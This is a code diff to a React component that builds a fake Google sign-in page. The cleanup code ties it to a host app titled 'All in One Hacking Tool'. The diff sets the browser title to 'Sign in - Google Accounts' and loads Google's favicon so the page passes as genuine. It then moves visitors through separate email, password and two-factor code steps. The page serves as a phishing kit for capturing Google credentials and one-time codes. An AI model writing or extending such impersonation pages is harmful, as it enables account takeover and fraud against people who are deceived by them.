@@ -1,12 +1,35 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import LeftSide from "./components/LeftSide";
-import RightSide from "./components/RightSide";
+import EmailStep from "./components/EmailStep";
+import PasswordStep from "./components/PasswordStep";
+import TwoFAStep from "./components/TwoFAStep";
 import Footer from "./components/Footer";
 
 const GoogleSignInTemplate = () => {
   const [step, setStep] = useState(1);
   const [userEmail, setUserEmail] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+
+  useEffect(() => {
+    document.title = "Sign in - Google Accounts";
+
+    let link = document.querySelector("link[rel~='icon']");
+    if (!link) {
+      link = document.createElement("link");
+      link.rel = "icon";
+      document.head.appendChild(link);
+    }
+
+    link.href = "https://www.google.com/favicon.ico";
+
+    return () => {
+      document.title =
+        "Cypro Vexto | All in One Hacking Tool | Modern Indutrial All Hacking Modules";
+      if (link) {
+        link.href = "/logo.png";
+      }
+    };
+  }, []);
 
   return (
     <>
@@ -17,14 +40,34 @@ const GoogleSignInTemplate = () => {
           {isLoading && <div className="loading-bar"></div>}
 
           <LeftSide step={step} email={userEmail} />
-          <RightSide
-            step={step}
-            setStep={setStep}
-            email={userEmail}
-            setEmail={setUserEmail}
-            setIsLoading={setIsLoading}
-            isLoading={isLoading}
-          />
+
+          {step === 1 && (
+            <EmailStep
+              setStep={setStep}
+              email={userEmail}
+              setEmail={setUserEmail}
+              setIsLoading={setIsLoading}
+              isLoading={isLoading}
+            />
+          )}
+
+          {step === 2 && (
+            <PasswordStep
+              setStep={setStep}
+              email={userEmail}
+              setIsLoading={setIsLoading}
+              isLoading={isLoading}
+            />
+          )}
+
+          {step === 3 && (
+            <TwoFAStep
+              setStep={setStep}
+              email={userEmail}
+              setIsLoading={setIsLoading}
+              isLoading={isLoading}
+            />
+          )}
         </div>
 
         <Footer />
@@ -426,7 +469,6 @@ const GoogleSignInTemplate = () => {
         .footer-links a{ color:#c7c7c7; text-decoration:none; font-size:13px; transition: 0.2s; padding: 6px 10px; border-radius: 4px; }
         .footer-links a:hover{ background: rgba(255, 255, 255, 0.05); }
 
-        /* TABLET STYLES (UNTOUCHED) */
         @media(max-width:900px){
           .signin-card{ flex-direction:column; padding:32px; transform: none; }
           .left-side{ width:100%; padding-right: 0; }
@@ -436,24 +478,23 @@ const GoogleSignInTemplate = () => {
           .loading-bar { left: 32px; width: calc(100% - 64px); }
         }
 
-        /* NEW MOBILE STYLES (SIRF MOBILE KE LIYE FIX KIYA HAI) */
         @media(max-width:600px){
           .google-page { 
             padding: 0; 
             background: #0e0e0e; 
-            justify-content: space-between; /* Card ko top pe aur footer ko bottom pe karega */
+            justify-content: space-between; 
             min-height: 100vh; 
           }
           .signin-card { 
             border-radius: 0; 
             padding: 36px 24px; 
-            flex: 1; /* Poori height lene ke liye */
+            flex: 1; 
             justify-content: flex-start; 
           }
           .footer { 
             padding: 16px 24px; 
-            flex-direction: row; /* Ek line me arrange karne ke liye */
-            flex-wrap: wrap; /* Agar screen choti ho to nicely neechay aajaye */
+            flex-direction: row; 
+            flex-wrap: wrap; 
             justify-content: space-between; 
             align-items: center; 
             gap: 12px; 
